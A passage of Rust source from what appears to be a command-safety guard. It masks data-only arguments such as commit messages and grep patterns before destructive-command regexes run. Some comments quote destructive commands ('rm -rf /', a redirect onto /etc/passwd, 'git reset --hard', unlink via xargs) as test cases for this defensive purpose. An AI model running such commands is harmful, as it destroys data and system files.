        // Git message flags - commit/tag messages are documentation
        SafeFlagEntry::both("git", "-m", "--message"),
        // Git log search - pattern is data (not executed)
        SafeFlagEntry::long("git", "--grep"),
        // Note: git commit -m is actually 'git' command with 'commit' subcommand + -m flag
        // We handle this at the command level since -m is always data for git

        // Beads CLI - descriptions and notes are documentation
        SafeFlagEntry::long_multi("bd", "--description"),
        SafeFlagEntry::long_multi("bd", "--title"),
        SafeFlagEntry::long_multi("bd", "--notes"),
        SafeFlagEntry::long_multi("bd", "--reason"),
        // beads_rust (`br`) is bd's successor with the same free-text flags plus
        // `--body`; its argument bodies are documentation, not executed (#225).
        SafeFlagEntry::long_multi("br", "--description"),
        SafeFlagEntry::long_multi("br", "--title"),
        SafeFlagEntry::long_multi("br", "--body"),
        SafeFlagEntry::long_multi("br", "--notes"),
        SafeFlagEntry::long_multi("br", "--reason"),
        // The rest of `br update`/`br create`/`br close`'s free-text fields
        // (#618). br stores each value; it never runs one. `--description-file`
        // names a path and stays unmasked. A value holding `$(…)` or backticks
        // is never masked: those run in the caller's shell before br starts.
        SafeFlagEntry::long_multi("br", "--append-notes"),
        SafeFlagEntry::long_multi("br", "--design"),
        SafeFlagEntry::long_multi("br", "--acceptance-criteria"),
        SafeFlagEntry::long_multi("br", "--acceptance"),
        SafeFlagEntry::long_multi("br", "--add-acceptance"),
        SafeFlagEntry::long_multi("br", "--prerequisites"),
        SafeFlagEntry::long_multi("br", "--transition-comment"),
        SafeFlagEntry::long_multi("br", "--agent-context"),
        SafeFlagEntry::long_multi("br", "--bypass-reason"),
        // Search tools - patterns are data, not executed (only pattern-supplying flags)
        SafeFlagEntry::both("grep", "-e", "--regexp"),
        SafeFlagEntry::both("rg", "-e", "--regexp"),
        SafeFlagEntry::both("ag", "-e", "--pattern"), // Silver Searcher
        SafeFlagEntry::both("ack", "-e", "--pattern"), // ack search tool
        // Sed expression values are considered for narrow, syntax-aware
        // masking below. Executing (`e`, `s///e`) programs are handled first
        // by the evaluator's semantic pass; file-writing (`s///w`) programs
        // remain visible to ordinary pack matching.
        SafeFlagEntry::both("sed", "-e", "--expression"),
        // GNU sed's `-l`/`--line-length` consumes the next argument. Without
        // modelling that arity, the numeric value is mistaken for the
        // positional program and the real substitution remains unmasked.
        SafeFlagEntry::both("sed", "-l", "--line-length"),
        // GitHub CLI - titles and bodies are documentation
        SafeFlagEntry::both("gh", "-t", "--title"),
        SafeFlagEntry::both("gh", "-b", "--body"),
        SafeFlagEntry::both("gh", "-m", "--message"),
        // `gh issue list -S` / `gh pr list --search` take a GitHub search
        // query; nothing in it is executed (#380). `gh search <kind>` takes
        // its query as positionals and is handled in the sanitizer loop.
        SafeFlagEntry::both("gh", "-S", "--search"),
        // Azure CLI (#384/#385): `--query` is a JMESPath filter applied to the
        // RESPONSE, and display names / descriptions / tags / Boards WIQL /
        // pull-request titles are free text. None of it is executed, and all
        // of it routinely contains words like `delete` or `account`. Only long
        // forms are registered: `az` reuses short flags per command (`-d` is
        // `--display-name` here and `--defaults` under `az devops configure`),
        // and several short flags carry paths that destructive-redirect rules
        // must keep seeing.
        SafeFlagEntry::long("az", "--query"),
        SafeFlagEntry::long("az", "--display-name"),
        SafeFlagEntry::long("az", "--description"),
        SafeFlagEntry::long("az", "--tags"),
        SafeFlagEntry::long("az", "--wiql"),
        SafeFlagEntry::long("az", "--title"),
        // curl - request data and headers are not executed
        SafeFlagEntry::both("curl", "-d", "--data"),
        SafeFlagEntry::both("curl", "-H", "--header"),
        SafeFlagEntry::long("curl", "--data-raw"),
        SafeFlagEntry::long("curl", "--data-binary"),
        // jq - variable values are data, not code
        SafeFlagEntry::long("jq", "--arg"),
        SafeFlagEntry::long("jq", "--argjson"),
        SafeFlagEntry::long("jq", "--slurpfile"),
        // Docker - labels are metadata, not code
        SafeFlagEntry::both("docker", "-l", "--label"),
        // kubectl - annotations and labels are metadata
        SafeFlagEntry::long("kubectl", "--annotation"),
        SafeFlagEntry::both("kubectl", "-l", "--label"),
        // No `xargs -I`: its placeholder is not data to hide but the argv
        // word that ends xargs' options. Blanking it (`xargs -I{} unlink {}`
        // became `xargs -I   unlink {}`) made every option parser on the
        // sanitized view read the CHILD COMMAND as the placeholder, so an
        // executed `unlink`, `chmod`, ... never reached its rule and was
        // allowed.
        // The placeholder reappears unmasked in the child argv anyway.
        // Cargo/npm - package descriptions
        SafeFlagEntry::long("cargo", "--message"),
        SafeFlagEntry::long("npm", "--message"),
    ],
};

/// Pre-computed Aho-Corasick automaton for quick-reject in sanitization.
///
/// If none of these command names appear in the input, we can skip tokenization
/// entirely since no masking would occur. This is a significant optimization for
/// commands like heredocs that don't invoke any of the safe-registry commands.
static SAFE_COMMANDS_MATCHER: LazyLock<AhoCorasick> = LazyLock::new(|| {
    // Collect all unique command names from the registry plus special built-ins
    let commands: &[&str] = &[
        // all_args_data commands
        "echo", "printf", // Commands from flag_data_pairs
        "git", "bd", "br", "grep", "rg", "ag", "ack", "sed", "gh", "curl", "jq", "docker",
        "kubectl", "cargo", "npm",
        // Special built-in: `command -v/-V` queries mask their arguments
        "command",
    ];
    AhoCorasick::new(commands).expect("static patterns should compile")
});

impl SafeStringRegistry {
    /// Check if a command has ALL its arguments as data.
    ///
    /// For commands like `echo` and `printf`, everything after the command
    /// is purely printed output, not executed.
    #[must_use]
    pub fn is_all_args_data(&self, command: &str) -> bool {
        let base_name = command.rsplit('/').next().unwrap_or(command);
        self.all_args_data.contains(&base_name)
    }

    /// Check if a specific flag for a command has a data-only argument.
    ///
    /// Returns true if the flag's argument should be treated as data
    /// (safe to skip pattern matching).
    #[must_use]
    pub fn is_flag_data(&self, command: &str, flag: &str) -> bool {
        let base_name = command.rsplit('/').next().unwrap_or(command);

        self.flag_data_pairs.iter().any(|entry| {
            entry.command == base_name
                && (entry.short_flag == Some(flag) || entry.long_flag == Some(flag))
        })
    }

    /// Check if a flag's data can span multiple tokens (until the next flag).
    #[must_use]
    pub fn is_flag_data_multivalue(&self, command: &str, flag: &str) -> bool {
        let base_name = command.rsplit('/').next().unwrap_or(command);

        self.flag_data_pairs.iter().any(|entry| {
            entry.command == base_name
                && entry.multi_value
                && (entry.short_flag == Some(flag) || entry.long_flag == Some(flag))
        })
    }

    /// Find all data-only flags for a given command.
    #[must_use]
    pub fn data_flags_for_command(&self, command: &str) -> Vec<&'static str> {
        let base_name = command.rsplit('/').next().unwrap_or(command);

        self.flag_data_pairs
            .iter()
            .filter(|entry| entry.command == base_name)
            .flat_map(|entry| {
                let short = entry.short_flag.into_iter();
                let long = entry.long_flag.into_iter();
                short.chain(long)
            })
            .collect()
    }
}

/// Check if a command's argument at a given position should be treated as data.
///
/// This is a convenience function that uses the default registry to determine
/// if an argument is purely data (not executed by the shell).
///
/// # Arguments
///
/// * `command` - The full command string
/// * `preceding_flag` - The flag (e.g., `-m`, `--message`) that owns the
///   argument under consideration, if any
///
/// # Returns
///
/// `true` if the argument at that position is known to be data-only.
#[must_use]
pub fn is_argument_data(command: &str, preceding_flag: Option<&str>) -> bool {
    let parts: Vec<&str> = command.split_whitespace().collect();
    if parts.is_empty() {
        return false;
    }

    let cmd = parts[0];

    // Check if all args are data for this command
    if SAFE_STRING_REGISTRY.is_all_args_data(cmd) {
        return true;
    }

    // Check if the preceding flag makes this argument data
    if let Some(flag) = preceding_flag {
        return SAFE_STRING_REGISTRY.is_flag_data(cmd, flag);
    }

    false
}

/// Decode one static POSIX word for the scoped flowctl data contract.
fn flowctl_static_word(raw: &str) -> Option<String> {
    if raw.is_empty() {
        return None;
    }
    // Validate the raw word before quote removal. Separators, globs, and
    // expansion spellings are data inside single quotes; double quotes keep
    // separators literal but still execute dollar/backtick substitutions.
    // Applying a byte blacklist after losing these roles rejected receipt
    // text such as 'npm test; git reset --hard' (#540).
    let bytes = raw.as_bytes();
    let mut quote = None;
    let mut index = 0;
    while let Some(&byte) = bytes.get(index) {
        match (quote, byte) {
            (Some(b'\''), b'\'') | (Some(b'"'), b'"') => quote = None,
            (Some(b'\''), _) => {}
            (_, b'\\') => {
                let &escaped = bytes.get(index + 1)?;
                if quote.is_none() || matches!(escaped, b'$' | b'`' | b'"' | b'\\' | b'\n') {
                    index += 1;
                }
            }
            (None, b'\'' | b'"') => quote = Some(byte),
            (_, b'$' | b'`') => return None,
            (
                None,
                b'*' | b'?' | b'[' | b'{' | b'~' | b';' | b'|' | b'&' | b'(' | b')' | b'<' | b'>'
                | b'#',
            ) => {
                return None;
            }
            (None, byte) if byte.is_ascii_whitespace() => return None,
            _ => {}
        }
        index += 1;
    }
    if quote.is_some() {
        return None;
    }
    let mut words = shell_words::split(raw).ok()?.into_iter();
    let value = words.next()?;
    words.next().is_none().then_some(value)
}

/// Return static data operand indices for flowctl gate check/receipt (#538).
#[must_use]
pub(crate) fn flowctl_gate_data_values(words: &[&str]) -> Option<SmallVec<[usize; 4]>> {
    if words.len() > 128 {
        return None;
    }
    let raw_executable = *words.first()?;
    let documented_handle = raw_executable == "\"$FLOWCTL\"";
    let literal_flowctl = flowctl_static_word(raw_executable)
        .is_some_and(|executable| executable.rsplit('/').next() == Some("flowctl"));
    if !documented_handle && !literal_flowctl {
        return None;
    }
    if words
        .get(1)
        .and_then(|word| flowctl_static_word(word))
        .as_deref()
        != Some("gate")
        || !matches!(
            words
                .get(2)
                .and_then(|word| flowctl_static_word(word))
                .as_deref(),
            Some("check" | "receipt")
        )
    {
        return None;
    }
    let mut values = SmallVec::new();
    let mut index = 3;
    let mut command_seen = false;
    while let Some(raw_flag) = words.get(index) {
        let flag = flowctl_static_word(raw_flag)?;
        if matches!(flag.as_str(), "--gate" | "--command") {
            let value = flowctl_static_word(words.get(index + 1)?)?;
            if value.starts_with('-') {
                return None;
            }
            values.push(index + 1);
            command_seen |= flag == "--command";
            index += 2;
        } else if flag.starts_with("--command=") || flag.starts_with("--gate=") {
            values.push(index);
            command_seen |= flag.starts_with("--command=");
            index += 1;
        } else if flag == "--json" {
            index += 1;
        } else {
            return None;
        }
    }
    command_seen.then_some(values)
}

#[derive(Clone, Copy)]
struct PendingSafeFlag<'a> {
    flag: &'a str,
    multi_value: bool,
}

/// Return whether an unquoted shell reserved word introduces the command that
/// follows it within the current separator-delimited segment.
///
/// The sanitizer does not implement a full shell grammar, but it must not
/// mistake control-flow words for executables. Otherwise, in
/// `then printf '...';`, `then` occupies the command slot and `printf`'s
/// data-only arguments remain visible to destructive regexes. Exact matching is
/// intentional: quoted words and paths such as `'then'` or `/usr/bin/then` are
/// ordinary executable spellings and must retain their arguments.
#[inline]
#[must_use]
pub(crate) fn is_shell_command_prefix_reserved_word(word: &str) -> bool {
    matches!(
        word,
        "if" | "then" | "elif" | "else" | "while" | "until" | "do" | "coproc" | "{" | "!"
    )
}

/// Create a sanitized view of `command` for regex-based pattern matching.
///
/// This function replaces known-safe *string arguments* (commit messages, issue
/// descriptions, grep patterns, etc.) so dangerous substrings inside those
/// arguments don't trigger false-positive blocks.
///
/// The sanitizer is intentionally conservative:
/// - It only strips arguments in the explicit [`SAFE_STRING_REGISTRY`].
/// - It never strips any token that appears to contain shell-executed constructs
///   like `$(` or backticks (even if the flag/command is otherwise safe).
///
/// After recursively checking substitutions, the evaluator can mask their
/// data-only argument values in the built-in pack view. Custom packs retain
/// the active substitution delimiters and enclosing quotes in a separate view,
/// so a policy can reject executable syntax without matching inert prose.
///
/// This is designed to be be used on the hot path, so it returns a borrowed view
/// when no sanitization is required.
#[must_use]
pub fn sanitize_for_pattern_matching(command: &str) -> Cow<'_, str> {
    let mut budget = HeredocReadBudget::for_command(command);
    let merged = match sanitize_mask_ranges(command, 0, &mut budget) {
        Some(merged) => merged,
        None if budget.exhausted => heredoc_body_openers(command),
        None => return Cow::Borrowed(command),
    };
    if merged.is_empty() {
        return Cow::Borrowed(command);
    }

    let bytes = command.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
    let mut last = 0;
    for range in merged {
        if range.start > last {
            out.extend_from_slice(&bytes[last..range.start]);
        }
        out.extend(std::iter::repeat_n(
            b' ',
            range.end.saturating_sub(range.start),
        ));
        last = range.end;
    }
    if last < bytes.len() {
        out.extend_from_slice(&bytes[last..]);
    }

    String::from_utf8(out).map_or(Cow::Borrowed(command), Cow::Owned)
}

/// The sorted, merged byte ranges [`sanitize_for_pattern_matching`] blanks in
/// `command`, a body `depth` bodies deep, or `None` when a token cannot be
/// sliced (nothing is masked then) or the readings would take more than their
/// budget (see [`HeredocReadBudget`]).
///
/// A command with heredoc bodies is also read with each body taken apart from
/// the lines around it (see [`heredoc_body_layouts`]), so that a quote or
/// expansion left open in a body masks nothing past its terminator line. Only
/// what every reading masks is masked: where a body is read right, that shows
/// the commands after it, and where the shell has no body, the reading whole
/// still shows whatever it showed.
fn sanitize_mask_ranges(
    command: &str,
    depth: usize,
    budget: &mut HeredocReadBudget,
) -> Option<SmallVec<[Range<usize>; 8]>> {
    budget.spend(command)?;
    let mut masked = plain_sanitize_mask_ranges(command)?;
    if masked.is_empty() || depth >= HEREDOC_SCAN_MAX_DEPTH {
        return Some(masked);
    }
    for bodies in heredoc_body_layouts(command) {
        let by_parts = sanitize_mask_ranges_by_parts(command, &bodies, depth, budget)?;
        masked = intersect_ranges(&masked, &by_parts);
    }
    Some(masked)
}

/// What [`sanitize_mask_ranges`] masks in `command` read with `bodies` taken
/// apart: the lines around them read with the bodies blanked, and each body
/// that follows a line of its own read as a script of its own. A body inside
/// a substitution stays part of that word, which no reading masks.
fn sanitize_mask_ranges_by_parts(
    command: &str,
    bodies: &[HeredocBody],
    depth: usize,
    budget: &mut HeredocReadBudget,
) -> Option<SmallVec<[Range<usize>; 8]>> {
    budget.spend(command)?;
    let mut outside = command.as_bytes().to_vec();
    for body in bodies {
        outside[body.range.clone()].fill(b' ');
    }
    // Each body starts after a newline and ends at one or at the end of the
    // input, so only whole characters were blanked.
    let outside = String::from_utf8(outside).ok()?;
    let mut by_parts: Vec<Range<usize>> = plain_sanitize_mask_ranges(&outside)?.into_vec();
    for body in bodies.iter().filter(|body| body.top_level) {
        let offset = body.range.start;
        let inner = sanitize_mask_ranges(command.get(body.range.clone())?, depth + 1, budget)?;
        by_parts.extend(
            inner
                .into_iter()
                .map(|range| range.start + offset..range.end + offset),
        );
    }
    by_parts.sort_by_key(|range| range.start);
    Some(merge_ranges(&by_parts))
}

/// The ranges both sorted, merged range lists cover.
fn intersect_ranges(left: &[Range<usize>], right: &[Range<usize>]) -> SmallVec<[Range<usize>; 8]> {
    let mut both = SmallVec::new();
    let (mut l, mut r) = (0, 0);
    while l < left.len() && r < right.len() {
        let start = left[l].start.max(right[r].start);
        let end = left[l].end.min(right[r].end);
        if start < end {
            both.push(start..end);
        }
        if left[l].end < right[r].end {
            l += 1;
        } else {
            r += 1;
        }
    }
    both
}

/// [`sanitize_mask_ranges`] for `command` read whole, heredoc bodies and all.
fn plain_sanitize_mask_ranges(command: &str) -> Option<SmallVec<[Range<usize>; 8]>> {
    // Quick-reject: if no safe-registry commands appear in the input AND no comments,
    // no masking is possible. Skip expensive tokenization entirely. This is a significant
    // optimization for heredocs and other large inputs that don't use these commands.
    // Note: We must still process commands with `#` to mask comments, even if no safe
    // commands are present (e.g., `python -c '...' # rm -rf /` should mask the comment).
    let has_comment_char = command.contains('#');
    let may_have_flowctl_data = command.contains("flowctl") || command.contains("FLOWCTL");
    if !SAFE_COMMANDS_MATCHER.is_match(command) && !has_comment_char && !may_have_flowctl_data {
        return Some(SmallVec::new());
    }
    token_mask_ranges(command, &tokenize_command(command), may_have_flowctl_data)
}

/// The masking pass of [`plain_sanitize_mask_ranges`] over `command`'s tokens.
#[allow(clippy::too_many_lines)] // Single-pass masking logic; refactor only if it becomes unreadable
fn token_mask_ranges(
    command: &str,
    tokens: &[SanitizeToken],
    may_have_flowctl_data: bool,
) -> Option<SmallVec<[Range<usize>; 8]>> {
    let mut mask_ranges: SmallVec<[Range<usize>; 8]> = SmallVec::new();

    // Per-segment state (segments split on shell separators like |, ;, &&, ||).
    let mut segment_cmd: Option<&str> = None;
    let mut segment_cmd_is_all_args_data = false;
    let mut pending_safe_flag: Option<PendingSafeFlag<'_>> = None; // Safe flag waiting for value(s)
    let mut options_ended = false;
    let mut search_pattern_masked = false;
    let mut wrapper: WrapperState = WrapperState::None;
    let mut command_query_mode = false;
    let mut search_cmd_override: Option<&str> = None;
    let mut git_subcommand: Option<&str> = None;
    let mut git_waiting_for_value = false;
    let mut git_options_ended = false;
    // `gh`: the first non-option token names the subcommand. `gh search
    // <kind> <query...>` is a read-only query whose entire remaining argv
    // (positionals and flag values alike) is search text, so it switches the
    // segment into the same all-args-data mode as echo/printf (#380).
    let mut gh_subcommand_seen = false;
    // For args-data commands (echo/printf): set when we just consumed a
    // shell redirect operator and the next token is its target. The
    // target is left visible (not masked) so destructive-redirect rules
    // can see it; the flag clears after one token so subsequent argv
    // returns to args-data masking.
    let mut next_token_is_redirect_target = false;

    for (token_index, token) in tokens.iter().enumerate() {
        if token.kind == SanitizeTokenKind::Separator {
            segment_cmd = None;
            segment_cmd_is_all_args_data = false;
            pending_safe_flag = None;
            options_ended = false;
            search_pattern_masked = false;
            wrapper = WrapperState::None;
            command_query_mode = false;
            search_cmd_override = None;
            git_subcommand = None;
            git_waiting_for_value = false;
            git_options_ended = false;
            gh_subcommand_seen = false;
            next_token_is_redirect_target = false;
            continue;
        }

        if token.kind == SanitizeTokenKind::Comment {
            mask_ranges.push(token.byte_range.clone());
            continue;
        }

        let token_text = token.text(command)?;

        // Skip line continuations (backslash at end of line)
        if token_text == "\\\n" || token_text == "\\\r\n" {
            continue;
        }

        if command_query_mode {
            // `command -v/-V` is query-only; treat all remaining args as data.
            if !token.has_inline_code {
                mask_ranges.push(token.byte_range.clone());
            }
            continue;
        }

        if segment_cmd.is_none() {
            // POSIX/Bash control-flow prefixes introduce a command but are not
            // themselves executables. Only skip them when no explicit wrapper
            // is active: `command then ...`, `env then ...`, and
            // `sudo then ...` intentionally select an executable named `then`.
            if wrapper == WrapperState::None && is_shell_command_prefix_reserved_word(token_text) {
                continue;
            }

            // Wrapper / prefix handling: allow stacked wrappers like `sudo env VAR=1 git ...`.
            if let Some(next_wrapper) = WrapperState::from_command_word(token_text) {
                wrapper = next_wrapper;
                continue;
            }
            if matches!(
                wrapper,
                WrapperState::Command {
                    options_ended: false,
                    ..
                }
            ) && command_option_is_query(token_text)
            {
                command_query_mode = true;
            }
            let (next_wrapper, skip) = wrapper.consume_token(token_text);
            wrapper = next_wrapper;
            if skip {
                continue;
            }
            if is_env_assignment(token_text) {
                continue;
            }

            if may_have_flowctl_data {
                let command_tokens: Vec<_> = tokens[token_index..]
                    .iter()
                    .take_while(|token| token.kind == SanitizeTokenKind::Word)
                    .take(129)
                    .collect();
                if let Some(words) = command_tokens
                    .iter()
                    .map(|token| token.text(command))
                    .collect::<Option<Vec<_>>>()
                    && let Some(values) = flowctl_gate_data_values(&words)
                {
                    for index in values {
                        let data_token = command_tokens[index];
                        if !data_token.has_inline_code {
                            mask_ranges.push(data_token.byte_range.clone());
                        }
                    }
                }
            }

            segment_cmd = Some(token_text);
            segment_cmd_is_all_args_data = SAFE_STRING_REGISTRY.is_all_args_data(token_text);
            search_cmd_override = None;
            git_subcommand = None;
            git_waiting_for_value = false;
            git_options_ended = false;
            gh_subcommand_seen = false;

            pending_safe_flag = None;
            options_ended = false;
            search_pattern_masked = false;
            continue;
        }

        let Some(cmd) = segment_cmd else {
            // Should be unreachable because we set segment_cmd on the first word of each segment,
            // but fail open for safety.
            continue;
        };

        let mut is_git_subcommand_token = false;
        if cmd == "git" && git_subcommand.is_none() {
            if git_waiting_for_value {
                git_waiting_for_value = false;
            } else if token_text == "--" {
                git_options_ended = true;
            } else if !git_options_ended && token_text.starts_with('-') && token_text != "-" {
                let takes_value = matches!(
                    token_text,
                    "-C" | "-c"
                        | "--git-dir"
                        | "--work-tree"
                        | "--namespace"
                        | "--exec-path"
                        | "--pager"
                        | "--config-env"
                ) || token_text.starts_with("-C")
                    || token_text.starts_with("-c")
                    || token_text.starts_with("--git-dir=")
                    || token_text.starts_with("--work-tree=")
                    || token_text.starts_with("--namespace=")
                    || token_text.starts_with("--exec-path=")
                    || token_text.starts_with("--pager=")
                    || token_text.starts_with("--config-env=");
                if takes_value && !token_text.contains('=') {
                    git_waiting_for_value = true;
                }
            } else {
                git_subcommand = Some(token_text);
                if token_text == "grep" {
                    search_cmd_override = Some("grep");
                    is_git_subcommand_token = true;
                }
            }
        }

        // `gh` has no global option that takes a value, so the first token
        // that is not option-shaped is the subcommand. Only `search` changes
        // masking; every other subcommand keeps the flag-driven handling
        // below (`--title`, `--body`, `-S`, ...).
        if !gh_subcommand_seen
            && cmd.rsplit('/').next().unwrap_or(cmd) == "gh"
            && !(token_text.starts_with('-') && token_text != "-")
        {
            gh_subcommand_seen = true;
            if token_text == "search" {
                segment_cmd_is_all_args_data = true;
                continue;
            }
        }

        if segment_cmd_is_all_args_data {
            // For commands like echo/printf, treat all args as data, but never strip inline code.
            //
            // Exception 1: standalone shell redirect operators (`>`,
            // `>>`, `>|`, `&>`, `1>`, `2>`, ...) end the data scope at
            // the shell-syntax layer — bash processes redirects BEFORE
            // echo runs, so the redirect TARGET is not echo's data.
            // We expose the operator and exactly one following token
            // (the target), then resume args-data masking. The narrow
            // single-token window prevents a regression where
            // `echo "x" > /var/log/app.log "rm -rf /"` would expose the
            // trailing string-literal `"rm -rf /"` to the
            // `rm-rf-root-home` rule and falsely block.
            //
            // Exception 2: tokens that contain a GLUED redirect
            // operator with attached target (e.g. `data>/etc/passwd`,
            // `2>/etc/passwd`, `"x">/etc/passwd`). The dcg tokenizer
            // doesn't break on `>`, so bash-level boundary `data` `>`
            // `/etc/passwd` arrives at sanitize as a single token. Mask
            // only the prefix BEFORE the operator (echo's data part);
            // leave the operator and target visible so the destructive
            // regex can match. Only an unquoted, unescaped `>` splits,
            // which is exactly when bash reads one as a redirection, so
            // quoted arrows like `echo "user>admin"` remain fully masked.
            if is_shell_redirect_operator(token_text) {
                next_token_is_redirect_target = true;
                continue;
            }
            if next_token_is_redirect_target {
                // Visible — let destructive-redirect rules see this path.
                next_token_is_redirect_target = false;
                continue;
            }
            if let Some(split_pos) = glued_redirect_split_position(token_text) {
                // Mask only the prefix; preserve the operator+target suffix.
                if split_pos > 0 && !token.has_inline_code {
                    let start = token.byte_range.start;
                    mask_ranges.push(start..start + split_pos);
                }
                continue;
            }
            if !token.has_inline_code {
                mask_ranges.push(token.byte_range.clone());
            }
            continue;
        }

        // Quoting a complete flag token does not change its argv spelling.
        // Semantic command views can quote the whole `--message=value` word,
        // including its flag. Unwrap one literal fragment for flag recognition
        // while retaining the original value offsets. Leave concatenated or
        // escaped quote fragments unrecognized rather than guessing their argv.
        let unquoted_flag = strip_matching_quotes(token_text);
        let (flag_text, flag_start) = if unquoted_flag.len() < token_text.len()
            && !unquoted_flag.contains(char::from(token_text.as_bytes()[0]))
        {
            (unquoted_flag, token.byte_range.start + 1)
        } else {
            (token_text, token.byte_range.start)
        };

        if let Some(pending) = pending_safe_flag {
            let is_flag_token = flag_text.starts_with('-') && flag_text != "-";
            if pending.multi_value {
                if token.has_inline_code || is_flag_token {
                    pending_safe_flag = None;
                } else {
                    if !token.has_inline_code {
                        mask_ranges.push(token.byte_range.clone());
                        if is_search_pattern_flag(cmd, pending.flag) {
                            search_pattern_masked = true;
                        }
                    }
                    pending_safe_flag = Some(pending);
                    continue;
                }
            } else {
                pending_safe_flag = None;
                if !token.has_inline_code && flag_data_value_is_inert(cmd, pending.flag, token_text)
                {
                    mask_ranges.push(token.byte_range.clone());
                }
                if is_search_pattern_flag(cmd, pending.flag) {
                    search_pattern_masked = true;
                }
                continue;
            }
        }

        // Handle --flag=value (and similar) forms.
        if let Some((flag, value_range)) = split_flag_assignment(flag_text, flag_start) {
            if SAFE_STRING_REGISTRY.is_flag_data(cmd, flag)
                && !token.has_inline_code
                && flag_data_value_is_inert(cmd, flag, &command[value_range.clone()])
            {
                // Mask only the value portion (after '='). Keep the flag prefix for readability.
                mask_ranges.push(value_range);

                // For search tools, masking a flag-supplied pattern should prevent masking the
                // first positional argument as a pattern.
                if is_search_pattern_flag(cmd, flag) {
                    search_pattern_masked = true;
                }
            }
            continue;
        }

        // Handle attached short-flag values like `-e"pattern"` or `-m"commit message"`.
        // This also covers combined clusters where the data-flag appears before the value
        // (e.g., `git commit -am"msg"`).
        if let Some((flag, value_range)) =
            split_short_flag_attached_value(cmd, flag_text, flag_start)
        {
            if !token.has_inline_code
                && flag_data_value_is_inert(cmd, flag, &command[value_range.clone()])
            {
                mask_ranges.push(value_range);
                if is_search_pattern_flag(cmd, flag) {
                    search_pattern_masked = true;
                }
            }
            continue;
        }

        // Handle separate flag + value forms.
        if SAFE_STRING_REGISTRY.is_flag_data(cmd, flag_text) {
            pending_safe_flag = Some(PendingSafeFlag {
                flag: flag_text,
                multi_value: SAFE_STRING_REGISTRY.is_flag_data_multivalue(cmd, flag_text),
            });
            continue;
        }
        if let Some(data_flag) = combined_short_data_flag_value(cmd, flag_text) {
            pending_safe_flag = Some(PendingSafeFlag {
                flag: data_flag,
                multi_value: SAFE_STRING_REGISTRY.is_flag_data_multivalue(cmd, data_flag),
            });
            continue;
        }

        // Search tools: treat the first positional argument as pattern (when not already supplied
        // via -e/--regexp/etc).
        let search_cmd = search_cmd_override.unwrap_or(cmd);
        if is_search_command(search_cmd) {
            if is_git_subcommand_token {
                continue;
            }
            if flag_text == "--" {
                options_ended = true;
                continue;
            }

            let is_option = !options_ended && flag_text.starts_with('-') && flag_text != "-";
            if is_option {
                continue;
            }

            if !search_pattern_masked {
                if !token.has_inline_code
                    && (search_cmd.rsplit('/').next().unwrap_or(search_cmd) != "sed"
                        || sed_script_is_maskable(token_text))
                {
                    mask_ranges.push(token.byte_range.clone());
                }
                search_pattern_masked = true;
            }
        }
    }

    mask_ranges.sort_by_key(|r| r.start);
    Some(merge_ranges(&mask_ranges))
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum WrapperState {
    None,
    Sudo {
        options_ended: bool,
        pending_value: bool,
    },
    Env {
        options_ended: bool,
        pending_value: bool,
    },
    Command {
        options_ended: bool,
        pending_value: bool,
    },
    /// A POSIX execution frontend (`nice`, `nohup`, `time`, `timeout`,
    /// `stdbuf`, `ionice`, `setsid`, `chrt`) that runs its trailing argv as a
    /// command. Without this, the launcher word became the segment command and
    /// the real command's data flags (e.g. `git commit -m <message>`) were
    /// never masked, so a destructive-looking word inside a commit message
    /// tripped raw pattern matching (issue #257). Mirrors the launcher set of
    /// `normalize::strip_posix_execution_frontend`.
    Launcher {
        kind: LauncherKind,
        options_ended: bool,
        pending_value: bool,
        operands_to_skip: u8,
    },
    /// `mise exec [TOOL@VERSION]... [--] <command>...` (and its `mise x`
    /// alias). Tool specs carry `@`; an explicit `--` unambiguously starts
    /// the wrapped command (issue #257).
    MiseExec {
        awaiting_subcommand: bool,
        pending_value: bool,
    },
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum LauncherKind {
    Nice,
    Ionice,
    Nohup,
    Setsid,
    Time,
    Timeout,
    Stdbuf,
    Chrt,
}

impl LauncherKind {
    #[must_use]
    fn from_basename(name: &str) -> Option<Self> {
        match name {
            "nice" => Some(Self::Nice),
            "ionice" => Some(Self::Ionice),
            "nohup" => Some(Self::Nohup),
            "setsid" => Some(Self::Setsid),
            "time" => Some(Self::Time),
            "timeout" => Some(Self::Timeout),
            "stdbuf" => Some(Self::Stdbuf),
            "chrt" => Some(Self::Chrt),
            _ => None,
        }
    }

    /// Options that consume the following token as their value.
    #[must_use]
    fn option_takes_separate_value(self, token: &str) -> bool {
        match self {
            Self::Nice => matches!(token, "-n" | "--adjustment"),
            Self::Ionice => matches!(
                token,
                "-c" | "--class" | "-n" | "--classdata" | "-p" | "-P" | "-u"
            ),
            Self::Time => matches!(token, "-f" | "--format" | "-o" | "--output"),
            Self::Timeout => matches!(token, "-k" | "--kill-after" | "-s" | "--signal"),
            Self::Stdbuf => matches!(token, "-i" | "-o" | "-e"),
            Self::Nohup | Self::Setsid | Self::Chrt => false,
        }
    }

    /// Positional operands the launcher consumes before the wrapped command
    /// (`timeout DURATION cmd`, `chrt PRIORITY cmd`).
    #[must_use]
    const fn operands_before_command(self) -> u8 {
        match self {
            Self::Timeout | Self::Chrt => 1,
            Self::Nice | Self::Ionice | Self::Nohup | Self::Setsid | Self::Time | Self::Stdbuf => 0,
        }
    }
}

impl WrapperState {
    #[inline]
    #[must_use]
    fn from_command_word(word: &str) -> Option<Self> {
        let base_name = word.rsplit('/').next().unwrap_or(word);
        match base_name {
            "sudo" => Some(Self::Sudo {
                options_ended: false,
                pending_value: false,
            }),
            "env" => Some(Self::Env {
                options_ended: false,
                pending_value: false,
            }),
            "command" => Some(Self::Command {
                options_ended: false,
                pending_value: false,
            }),
            "mise" => Some(Self::MiseExec {
                awaiting_subcommand: true,
                pending_value: false,
            }),
            other => LauncherKind::from_basename(other).map(|kind| Self::Launcher {
                kind,
                options_ended: false,
                pending_value: false,
                operands_to_skip: kind.operands_before_command(),
            }),
        }
    }

    #[inline]
    #[must_use]
    fn consume_token(self, token: &str) -> (Self, bool) {
        match self {
            Self::None => (Self::None, false),
            Self::Sudo {
                options_ended,
                pending_value,
            } => consume_wrapper_token(
                token,
                Self::Sudo {
                    options_ended,
                    pending_value,
                },
                sudo_option_takes_value,
            ),
            Self::Env {
                options_ended,
                pending_value,
            } => consume_wrapper_token(
                token,
                Self::Env {
                    options_ended,
                    pending_value,
                },
                env_option_takes_value,
            ),
            Self::Command {
                options_ended,
                pending_value,
            } => consume_wrapper_token(
                token,
